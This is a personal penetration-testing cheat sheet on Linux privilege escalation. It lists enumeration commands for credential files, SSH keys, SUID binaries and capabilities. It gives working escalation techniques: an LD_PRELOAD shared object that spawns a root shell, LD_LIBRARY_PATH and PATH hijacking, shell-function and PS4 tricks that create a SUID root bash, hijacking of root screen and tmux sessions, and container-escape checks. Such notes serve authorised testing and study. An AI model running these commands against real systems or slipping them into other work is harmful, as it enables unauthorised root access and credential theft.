---
sidebar_position: 1
---

# Linux Privilege Escalation

## Enumeration

My flow:
1. check system info for anything valuable
    1. current user's permissions and capabilities?
    2. readable sensitive files? writable locations?
    3. exploitable cronjobs?
    4. exploitable running processes or applications, ex: webapps with writable folders?
    5. SUID/SGID?
    6. kernel exploits (last resort)
2. enumerate local files
    1. files with credentials or sensitive stuff
        1. SSH keys
        2. app, database, and other config files
        3. history files: `cat ~/.*history`
    2. exploitable executable files? 

### System Info

Always check system info, including machine architecture (for building and choosing exploits), users and groups, running processes and automated tasks, permissions of files and folders, etc.

```bash
# machine info
whoami
hostname
uname -a
/etc/issue
/proc/version

# check applications and packages
dpkg -l

# kernel modules
lsmod
/sbin/modinfo <pkgname>

# check users
cat /etc/passwd

# check cron 
cat /etc/crontab 
grep "CRON" /var/log/cron.log

# check disk partition and devices 
cat /etc/fstab 
cat /bin/lsblk

# check processes and running applications
ps -aux 
./pspy64
service --status-all

# check network
cat /sbin/route
cat /proc/net/tcp
netstat -tunlp
ss -anp

# Any unusually short timers?
systemctl list-timers --all
```

### Finding InTesRestInG files and folders
Always checks what you can read or write!

```bash
# check for write permissions on anything 
find / -writable -type d 2>/dev/null 
find / -writable -type f 2>/dev/null | grep -v '/proc\|/run\|/var\|/sys'
find / -perm -u=s -type f 2>/dev/null 

# check files owned by a user and exclude certain directories
find / -user sysadm -ls 2>/dev/null | grep -v '/proc\|/run'

# finds logs readable by this user
find /var/log -readable -ls

# find files modified between date
find / -newermt 2019-03-01 ! -newermt 2019-03-10

# locations that SHOULD usually be empty
la -lah /opt
ls -lah /srv

# grepping for strings recursively
grep -rHa "192.168.5.2" /var/log
grep -rnw '/var/www/html/admin' -e 'pass'
```

### SUID/SGID and capabilities
Check if your user has SUID/SGID permissions on anything.
Best goto: [GTFOBins](https://gtfobins.github.io/)

:::tip My tip

Sometimes, writing in `/tmp` may cause GTFObins to fail -> write to `/dev/shm` to work! (Perhaps due to permissions)

:::

```bash
# check SUDO
sudo -l
ls /etc/sudoers
ls /etc/sudoers.d

# find SUID/SGID
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

# get capabilities
find / -exec getcap {} \; 2>/dev/null
```

If you find a non-standard SUID/SGID binary, see below for abusing file paths.

### Exploiting dependencies
#### SUDO
If you can run any programs with sudo, you can try to abuse `LD_PRELOAD` and `LD_LIBRARY_PATH`. `LD_PRELOAD` loads a shared object before any others when a program is run. `LD_LIBRARY_PATH` provides a list of directories where shared libraries are searched for first.

**Abuse `LD_PRELOAD`**
```bash
# Step 1: create preload.c with shell-opening code
cat > preload.c <<EOF
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        system("/bin/bash -p");
}
EOF

# step 2: compile it into a shared object
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/sudo/preload.c

# step 3: sudo run program with shared object
sudo LD_PRELOAD=/tmp/preload.so program
```

**Abuse `LD_LIBRARY_PATH`**
```bash
# Step 1: check used shared libs
ldd /usr/sbin/apache2

# Step 2: create a shared object with the same name 
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c

# Step 3: run program and set load location to controlled directory
sudo LD_LIBRARY_PATH=/tmp apache2
```

#### SUID/SGID File paths

For non-standard executables that you have SUID/SGID permissions on, try grepping the strings or use strace to see what binaries are called. You may be able to trick the executable into running your exploit by confusing file paths.

> TIP 1: If the full path is not specified, try writing an executable in the current directory and export PATH to abuse precedence. 

Example: `/usr/local/bin/suid-env` starts an apache server via `service apache2 start` without specifying the full path of executable `service`
Exploit:  compile our own `service` executable and prepend the PATH variable with the current directory to hijack the accessed env: `PATH=.:$PATH /usr/local/bin/suid-env`

> Tip 2: The full path IS specified, but Bash version < 4.2-048, we can abuse shell features with names that resemble file paths!

Example: `/usr/local/bin/suid-env` starts an apache server via `/usr/sbin/service apache2 start` 
Exploit: create and export a shell function to confuse the executable
```bash
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
```

> Tip 3: When Bash version < 4.4, we can run it in debugging mode and use the `PS4` variable for debugging statements.

Exploit: provide the PS4 variable to run arbitrary commands 
```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2

# run shell with root privileges
/tmp/rootbash -p
```

## Kernel Exploits

## Others

### Abusing stuff running as ROOT
> **screen**

If screen is running as root, for example:
``` bash
/bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root ;; done
```
Try connecting to root screen with `screen -x root/root`.

> **tmux**

If tmux is running as root, try connecting to a session with `tmux -S /.devs/dev_sess`.

> **logrotate**

Race condition affecting versions 3.8.6, 3.11.0, 3.15.0. If:
1. logrotate is running as root
2. versions 3.8.6, 3.11.0, 3.15.0
3. you have write permissions on a log directory

then you can use [logrotten](https://github.com/whotwagner/logrotten)! Download, compile, and run the exploit on victim to profit!


### Container escape
**Environment**
```bash
# check if in container
cat /proc/1/cgroup
# look for owner of /proc (if root/root then you're in a privileged container)
ls -la /proc
```
**Check capabilities**: might escape if you have one of: CAP_SYS_ADMIN, CAP_SYS_PTRACE, CAP_SYS_MODULE, DAC_READ_SEARCH, DAC_OVERRIDE
```bash
capsh --print
```
